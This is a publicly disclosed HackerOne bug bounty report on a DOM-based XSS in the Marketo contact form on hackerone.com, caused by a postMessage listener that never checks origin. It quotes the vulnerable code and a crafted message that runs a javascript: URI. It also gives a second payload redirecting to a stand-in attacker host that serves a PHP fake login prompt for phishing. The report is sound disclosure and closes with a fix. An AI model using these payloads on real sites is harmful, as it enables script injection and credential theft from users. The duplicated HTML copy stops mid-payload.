{"id":398054,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTgwNTQ=","url":"https://hackerone.com/reports/398054","title":"DOM Based XSS in www.hackerone.com via PostMessage","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-08-22T08:43:35.166Z","submitted_at":"2018-08-22T08:43:35.166Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"adac95","url":"/adac95","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-02-21T04:51:45.159Z","bug_reporter_agreed_on_going_public_at":"2019-02-21T04:51:45.040Z","team_member_agreed_on_going_public_at":"2018-12-28T14:37:49.707Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\nThe Marketo contact form available on the www.hackerone.com website is affected by a cross-site scripting vulnerability, caused by an insecure 'message' event listener installed on the page. Whilst this could allow an attacker to execute JavaScript in the context of the www.hackerone.com application, there were some restrictions which reduced the overall risk presented by the vulnerability.\n\n**Description:**\n\nThe Marketo contact form, which can be used by visiting /contact or '#contact/' is implemented using message events sent between the hackerone.com window an embedded Marketo iframe. When the 'submit' button is clicked, a message containing the form data and some other configuration information is sent to the Marketo iframe, which then submits the data to the server. Once this process is complete, the Marketo iframe sends another message back to the hackerone.com window, reporting the success or failure of the submission.\n\nThe JavaScript functions used to handle the message events inside the hackerone.com window have been included below. (Note that this code and all other code examples are taken from the unminified version of the Marketo forms2.js script. www.hackerone.com uses the minified version):\n\n```javascript\n$(window).on(\"message\", onMessage);\nfunction onMessage (e){\n  if(e.originalEvent \u0026\u0026 e.originalEvent.data){\n    var d;\n    try {\n      d = $.parseJSON(e.originalEvent.data);\n    }catch(ex){\n      return;\n    }\n    if(d.mktoReady){\n      onReady();\n    }else if(d.mktoResponse){\n      onResponse(d.mktoResponse)   \n    }\n  }\n}\n```\n\nThe 'message' event listener is instantiated using JQuery, and is configured to call the onMessage function, which parses the data from a string to an Object and then checks for a 'mktoReady' or a 'mktoResponse' property. If the 'mktoResponse' property is found, the following function is called with the property's value as an argument:\n\n```javascript\nfunction onResponse(mktoResponse){\n  var requestId = mktoResponse[\"for\"];\n  var request = inflight[requestId];\n  if(request){\n    if(mktoResponse.error){\n      request.error(mktoResponse.data);\n    }else{\n      request.success(mktoResponse.data);\n    }\n  }\n  delete inflight[requestId];\n}\n```\n\nHere, a variable 'requestId' is created and set to the value of the 'for' property of the 'mktoResponse' object, and this is then used to retrieve another object from the 'inflight' array. Inspection of the code revealed that the inflight object is created when the form is submitted, and contains two methods which will be called when the form submission is either successful, or when an error has occurred. If the 'mktoResponse' object contains a property named 'error', the inflight 'error' method will be called. Otherwise, the 'success' method is called with the data property as an argument:\n\n```javascript\nvar success = function (data){\n  if(data.error){\n    onError(data);\n  }else if(data.formId){\n    var u = findCorrectFollowUpUrl(data);\n    if(false === onSuccess(values, u)){\n      return;\n    }\n    cookieHelper.removeCookieAllDomains(\"_mkto_purl\");\n    location.href = u;\n  }\n}\n```\n\nThe success function is fairly simple - if there is no error set in the response, it creates a variable named 'u' and sets it to the return value of the 'findCorrectFollowUpUrl' method. This performs some processing on a property named 'followUpUrl' in the response object, which seemed to be a URL to redirect to after the form submission was complete. This was not used by the HackerOne form, but by setting it to an absolute URL, it was possible to control the value of the 'u' variable, which was later used to change the location.href of the window. When the following mktoResponse message was sent to the Hackerone window, the window was redirected to the JavaScript URI, and the code 'alert(document.domain)' was executed by the web browser (screenshot attached):\n\n```javascript\n{\"mktoResponse\":{\"for\":\"mktoFormMessage0\",\"error\":false,\"data\":{\"formId\":\"1013\",\"followUpUrl\":\"javascript:alert(document.domain);//\",\"aliId\":17144124}}}\n```\n\nHowever, there were some limitations to this vulnerability which meant that it was not immediately exploitable. First, redirections to a JavaScript URI are considered equivalent to the execution of inline JavaScript, meaning this redirection was blocked by HackerOne's Content Security Policy. Ordinarily, this type of issue would still be exploitable in a browser which does not support CSP (such as Internet Explorer 11), however there appear to be some functional issues, which mean that the site does not work in IE11. I received the following errors in the developer console, which reported that the JavaScript made use of the 'includes' function, which is not available in IE11, causing an error:\n\n```javascript\nSCRIPT438: Object doesn't support property or method 'includes'\njs_gSD6OxivXJVJaZwXxHUQz15yz9xczqXghcBxuRO0Ieo.js (43,5)\n```\n\nAnother limitation was that the user was required to first visit an attacker's website, and submit the contact form (in order for the inflight object to be populated with the success and error functions). However, based on this report (which required the same conditions) I think it is reasonable to assume that this is accepted as a possible scenario: https://hackerone.com/reports/207042\n\nI was able to get this to execute in Firefox, after disabling CSP using a Burp match and replace on response headers (removing ^Content-Security-Policy: .*$), and a PoC which I have attached to this report. The PoC works by convincing the user to open the Hackerone window by clicking a button (the attacker may include some text here asking that the user fill in the form and submit it). The JavaScript SetInterval function is then used to send a message containing the mktoResponse payload to the window every 250 milliseconds - this is necessary because, when the user submits the form, Marketo will respond with its own message. Repeatedly sending messages will ensure that the attacker's payload is processed by the success function before the legitimate Marketo message.\n\nAnother potential 'exploit' via this vulnerability, which does not trigger CSP but could allow for phishing attacks to occur, would be the following message:\n\n```javascript\n{\"mktoResponse\":{\"for\":\"mktoFormMessage0\",\"error\":false,\"data\":{\"formId\":\"1013\",\"followUpUrl\":\"https://attacker.sometld/401.php\",\"aliId\":17144124}}}\n```\n\nThe 401.php page should contain the following content, causing a basic authentication request to show:\n\n```php\n\u003c?php\nheader('WWW-Authenticate: Basic realm=\"Log in to HackerOne\"');\nheader('HTTP/1.0 401 Unauthorized');\n?\u003e\n```\n\nIn Firefox and Microsoft Edge, when the authentication prompt is shown the www.hackerone.com page is still visible in the background, making it possible that a user may not realise that the authentication prompt is related to a different application. I have attached a screenshot of this behaviour in Firefox.\n\nIt should be noted that this could still be exploited in older versions of web browsers which do not support CSP (Chrome/Firefox ~2013 and earlier, for example). Additionally, if changes are made to the www.hackerone.com application which fix the functional issues, allowing the contact form to be used in IE11, this vulnerability could be immediately used to execute XSS against users of IE11.\n\nTo fix this, Marketo should add a check in the listener which ensures that all messages received from another window were sent by a trusted origin. In my testing, I only saw messages sent from a subdomain of 'marketo.com', so I would suggest that they either whitelist the subdomains used to host their messaging iframes, or allow messages from all Marketo subdomains. The value of the followUpUrl property should also be validated, to ensure that it is a HTTP/HTTPS URL, to prevent redirection to to a JavaScript URI.\n\n## Impact\n\nAn attacker could be able to execute JavaScript in the context of the www.hackerone.com application, if the victim user makes use of a browser which does not support CSP. The attacker could also perform a limited phishing attack in Firefox or Microsoft Edge.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThe Marketo contact form available on the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e website is affected by a cross-site scripting vulnerability, caused by an insecure \u0026#39;message\u0026#39; event listener installed on the page. Whilst this could allow an attacker to execute JavaScript in the context of the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e application, there were some restrictions which reduced the overall risk presented by the vulnerability.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThe Marketo contact form, which can be used by visiting /contact or \u0026#39;#contact/\u0026#39; is implemented using message events sent between the hackerone.com window an embedded Marketo iframe. When the \u0026#39;submit\u0026#39; button is clicked, a message containing the form data and some other configuration information is sent to the Marketo iframe, which then submits the data to the server. Once this process is complete, the Marketo iframe sends another message back to the hackerone.com window, reporting the success or failure of the submission.\u003c/p\u003e\n\n\u003cp\u003eThe JavaScript functions used to handle the message events inside the hackerone.com window have been included below. (Note that this code and all other code examples are taken from the unminified version of the Marketo forms2.js script. \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e uses the minified version):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eonMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eonMessage\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparseJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eex\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoReady\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eonReady\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u0026#39;message\u0026#39; event listener is instantiated using JQuery, and is configured to call the onMessage function, which parses the data from a string to an Object and then checks for a \u0026#39;mktoReady\u0026#39; or a \u0026#39;mktoResponse\u0026#39; property. If the \u0026#39;mktoResponse\u0026#39; property is found, the following function is called with the property\u0026#39;s value as an argument:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003erequestId\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efor\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003einflight\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003erequestId\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esuccess\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003edelete\u003c/span\u003e \u003cspan class=\"nx\"\u003einflight\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003erequestId\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere, a variable \u0026#39;requestId\u0026#39; is created and set to the value of the \u0026#39;for\u0026#39; property of the \u0026#39;mktoResponse\u0026#39; object, and this is then used to retrieve another object from the \u0026#39;inflight\u0026#39; array. Inspection of the code revealed that the inflight object is created when the form is submitted, and contains two methods which will be called when the form submission is either successful, or when an error has occurred. If the \u0026#39;mktoResponse\u0026#39; object contains a property named \u0026#39;error\u0026#39;, the inflight \u0026#39;error\u0026#39; method will be called. Otherwise, the \u0026#39;success\u0026#39; method is called with the data property as an argument:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003esuccess\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eonError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eformId\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efindCorrectFollowUpUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003eonSuccess\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003evalues\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ecookieHelper\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveCookieAllDomains\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e_mkto_purl\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehref\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe success function is fairly simple - if there is no error set in the response, it creates a variable named \u0026#39;u\u0026#39; and sets it to the return value of the \u0026#39;findCorrectFollowUpUrl\u0026#39; method. This performs some processing on a property named \u0026#39;followUpUrl\u0026#39; in the response object, which seemed to be a URL to redirect to after the form submission was complete. This was not used by the HackerOne form, but by setting it to an absolute URL, it was possible to control the value of the \u0026#39;u\u0026#39; variable, which was later used to change the location.href of the window. When the following mktoResponse message was sent to the Hackerone window, the window was redirected to the JavaScript URI, and the code \u0026#39;alert(document.domain)\u0026#39; was executed by the web browser (screenshot attached):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efor\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emktoFormMessage0\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eformId\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e1013\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efollowUpUrl\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ejavascript:alert(document.domain);//\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ealiId\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e17144124\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever, there were some limitations to this vulnerability which meant that it was not immediately exploitable. First, redirections to a JavaScript URI are considered equivalent to the execution of inline JavaScript, meaning this redirection was blocked by HackerOne\u0026#39;s Content Security Policy. Ordinarily, this type of issue would still be exploitable in a browser which does not support CSP (such as Internet Explorer 11), however there appear to be some functional issues, which mean that the site does not work in IE11. I received the following errors in the developer console, which reported that the JavaScript made use of the \u0026#39;includes\u0026#39; function, which is not available in IE11, causing an error:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eSCRIPT438\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e \u003cspan class=\"nx\"\u003edoesn\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003et support property or method \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\njs_gSD6OxivXJVJaZwXxHUQz15yz9xczqXghcBxuRO0Ieo.js (43,5)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnother limitation was that the user was required to first visit an attacker\u0026#39;s website, and submit the contact form (in order for the inflight object to be populated with the success and error functions). However, based on this report (which required the same conditions) I think it is reasonable to assume that this is accepted as a possible scenario: \u003ca title=\"https://hackerone.com/reports/207042\" href=\"https://hackerone.com/reports/207042\"\u003ehttps://hackerone.com/reports/207042\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI was able to get this to execute in Firefox, after disabling CSP using a Burp match and replace on response headers (removing ^Content-Security-Policy: .*$), and a PoC which I have attached to this report. The PoC works by convincing the user to open the Hackerone window by clicking a button (the attacker may include some text here asking that the user fill in the form and submit it). The JavaScript SetInterval function is then used to send a message containing the mktoResponse payload to the window every 250 milliseconds - this is necessary because, when the user submits the form, Marketo will respond with its own message. Repeatedly sending messages will ensure that the attacker\u0026#39;s payload is processed by the success function before the legitimate Marketo message.\u003c/p\u003e\n\n\u003cp\u003eAnother potential \u0026#39;exploit\u0026#39; via this vulnerability, which does not trigger CSP but could allow for phishing attacks to occur, would be the following message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efor\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan 